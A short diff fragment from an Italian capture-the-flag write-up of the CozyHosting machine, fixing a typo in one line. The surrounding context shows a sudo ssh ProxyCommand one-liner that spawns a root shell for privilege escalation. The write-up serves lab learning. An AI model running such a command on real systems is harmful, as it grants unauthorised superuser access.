@@ -337,7 +337,7 @@ If the binary is allowed to run as superuser by `sudo`, it does not drop the el
     ```
 ```
 
-Non ci resta prova 
+Non ci resta provare 
 
 ```shell-session
 josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
